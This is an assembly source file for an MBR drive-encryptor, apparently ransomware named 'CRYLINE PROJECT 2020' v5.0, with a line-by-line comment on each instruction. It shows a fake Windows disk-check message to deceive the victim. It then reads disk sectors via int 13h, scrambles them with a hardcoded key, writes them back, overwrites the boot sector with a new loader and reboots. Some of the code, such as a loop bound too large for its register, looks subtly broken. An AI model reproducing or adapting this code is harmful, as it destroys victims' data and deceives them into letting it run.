;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE PROJECT 2020 ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;         v5.0         ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;  - DRIVE ENCRYPTOR - ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

bits16              ; <= Compiler options. Compile to .bin file extension

mov ah, 0x00        ; <= Change video mode | AH in 10h interrupt - it's a value to change modes and functions
mov al, 0x03        ; <= Change video mode flag [Number of mode] - it's a value to change screen mode to 640x200
int 0x10            ; <= Use 10h interrupt

mov ah, 0x0B        ; <= Set pallet options | AH in 10h interrupt - it's a value to change modes and functions
mov bh, 0x00        ; <= Set background color = black
int 0x10            ; <= Use 10h interrupt

jmp showFakeBanner  ; <= Jump to 'showFakeBanner' function address

showFakeBanner:                ; <= Function 'ShowFakeBanner'
        mov si, showBanner     ; <= Move text to SI register
        call printText         ; <= Call print function

        jmp driveEncrypt       ; <= Jump to 'driveEncrypt' function address

printText:                     ; <= Function 'printText'
        mov ah, 0x0e           ; <= Set the text print mode
        mov bh, 0x00           ; <= Set screen and text parameters
        mov bl, 0x07           ; <= Set screen and text parameters

printChar:
        mov al, [si]           ; <= Move bytecode from memory address [RAM] of SI to AL register

        cmp al, 0              ; <= If AL = 0...
        je endPrinting         ; <= Call function 'endPrinting'
                               ; <= Else...
        int 0x10               ; <= Use 10h interrupt
        add si, 1              ; <= Move +1 to SI register (inc si)
        jmp printChar          ; <= Jump to 'printChar' function. It's a simple loop

endPrinting:                   ; <= Function 'endPrinting'
        ret                    ; <= Return


driveEncrypt:                                            ; <= Function 'driveEncrypt'
        mov ch, 0                                        ; <= Set cylinders counter of hard drive

        countCylinders:                                  ; <= Function 'countCylinders'
                mov dh, 0                                ; <= Set headers counter of hard drive
                       
                countHeaders:                            ; <= Function 'countHeaders'
                        mov cl, 7                        ; <= Set start sector [SetFilePointer(seven sector of hard drive)]

                        countSectors:                   ; <= Function 'countSectors'
                                mov bx, 0x2000           ; <= Move segment address to BX register
                                mov es, bx               ; <= Move BX -> ES
                                mov bx, 0                ; <= Set null-pointer memory offset to BX
                                mov ah, 0x02             ; <= Set function 'reading' of 13h interrupt
                                mov al, 128              ; <= Set function 'how sectors reading'
                                int 0x13                 ; <= Using 13h interru[t

                                mov bx, 0xE8AC           ; <= Move simple key to BX register
                                mov si, 0                ; <= Set null-pointer memory offset to SI for counting offsets in segment 0x2000

                                countBytes:                           ; <= Function 'countBytes'
                                        add word[es:si], si           ; <= Add counter bytes from si to RAM stack 0x2000:01,02,02,04...etc of counter si | SI[1,2,3,4,5,6...n] => 0x2000:SI[1,2,3,4,5,6...n]
                                        shl byte[es:si], 4            ; <= Swap bytes
                                        mov ax, bx                    ; <= Mov simple key to AX for call function 'mul'
                                        mul byte[es:si]               ; <= Multiply byte from RAM stack 0x2000:SI-counter
                                        add word[es:si], bx           ; <= Add word-bytes(4 bytes) from BX register to stack ES:SI [0x2000:SI-counter]
                                        shr byte[es:si], 2            ; <= Swap bytes
                                        sub word[es:si], si           ; <= Subtract 4 bytes from SI to ES:SI
                                        mov ax, si                    ; <= Mov byte of SI-counter to AX
                                        mul byte[es:si]               ; <= Multiply [ES:SI] to register AX [Standart opertation 'mul']
                                        add word[es:si], dx           ; <= Add 4 byte to ES:SI from DX 
                                        shl byte[es:si], 1            ; <= Swap bytes
                                        inc si                        ; <= Increment SI | SI += 1;
                                        cmp si, 65535                 ; <= While SI < 65535...
                                        jnz countBytes                ; <= Create loop | move to function 'countBytes'

                                        mov bx, 0x2000                ; <= Move 0x2000 segment to BX register
                                        mov es, bx                    ; <= Move BX -> ES | Moving data from free register to segment register
                                        mov bx, 0                     ; <= Move null-pointer to BX
                                        mov ah, 0x03                  ; <= Set function 'writing' to 13h interrupt
                                        mov al, 128                   ; <= Set 'how sectors writing'
                                        int 0x13                      ; <= Using 13h interrupt

                                inc cl                                ; <= Increment CL | CL += 1;
                                cmp cl, 1224                            ; <= While CL < 1224...
                                jnz countSectors                      ; <= Create loop | move to function 'countSectors'

                        inc dh                               ; <= Increment DH | DH += 1;
                        cmp dh, 16                           ; <= While DH < 16....
                        jnz countHeaders                     ; <= Create loop | move to function 'countHeaders'

                mov si, showDot                              ; <= Set emulation of downloading...       
                call printText                               ; <= Show text
                inc ch                                       ; <= Increment CH
                cmp ch, 5                                    ; <= While CH < 5....
                jnz countCylinders                           ; <= Create loop | move to function 'countCylinders'
        
        jmp readNewLoader                                    ; <= Jump to function 'readNewLoader'

readNewLoader:                                               ; <= Function 'readNewLoader'
        mov bx, 0x8000                                       ; <= Move segment 0x8000 to register BX
        mov es, bx                                           ; <= Move BX -> ES
        mov bx, 0                                            ; <= Move null-pointer to BX register
        mov ah, 0x02                                         ; <= Set function 'reading' to 13h interrupt
        mov al, 1                                            ; <= Set 'how sectors reading'
        mov dh, 0                                            ; <= Set hard drive header -> 0
        mov ch, 0                                            ; <= Set hard drive cylinder -> 0
        mov cl, 6                                            ; <= Set start sector for reading | SetFilePointer(6 sectors hard disk);
        int 0x13                                             ; <= Using 13h interrupt
        jc readNewLoader                                     ; <= If error... Repeat this function!
        jmp writeNewLoader                                   ; <= If normal... Jump to function 'writeNewLoader'
 
        writeNewLoader:                                      ; <= Function 'writeNewLoader'
                mov bx, 0x8000                               ; <= Move segment 0x8000 to BX
                mov es, bx                                   ; <= Move BX -> ES
                mov bx, 0                                    ; <= Set offset - 0x0000 in BX
                mov ah, 0x03                                 ; <= Set function 'write' to 13h interrupt
                mov al, 1                                    ; <= Set 'how sectors reading'
                mov dh, 0                                    ; <= Set hard drive header -> 0
                mov ch, 0                                    ; <= Set hard drive cylinder -> 0
                mov cl, 1                                    ; <= Set start sector | SetFilePointer(first sector of hard disk);
                int 0x13                                     ; <= Using 13h interrupt
                jc writeNewLoader                            ; <= If writing error... Loop! Move to function 'writeNewLoader' and reading again
                jmp 0xFFFF:0x0000                            ; <= Jump to BIOS memory address | Reboot

showBanner: db 'Windows has encountered a problem communicating with a device connected to your computer. ', 0xA, 0xD, 'This error can be caused by unplugging a removable storage device such as an    external USB drive while the device is in use, or by faulty hardware such as a  hard drive or CD-ROM drive that is failing. You may cancel the drive check, but it is strongly recommended that you continue. ', 0xA, 0xD, ' ', 0xA, 0xD, 'If you continue to receive this this error message, wait for the hard drive     check to finish and contact the hardware manufacturer.', 0xA, 0xD, ' ', 0xA, 0xD, 'Windows will now check the drive...', 0 ; <= It's a fake text for show
showDot: db '.'
times 1024-($-$$) db 0                                       ; <= Add null-bytes in free space 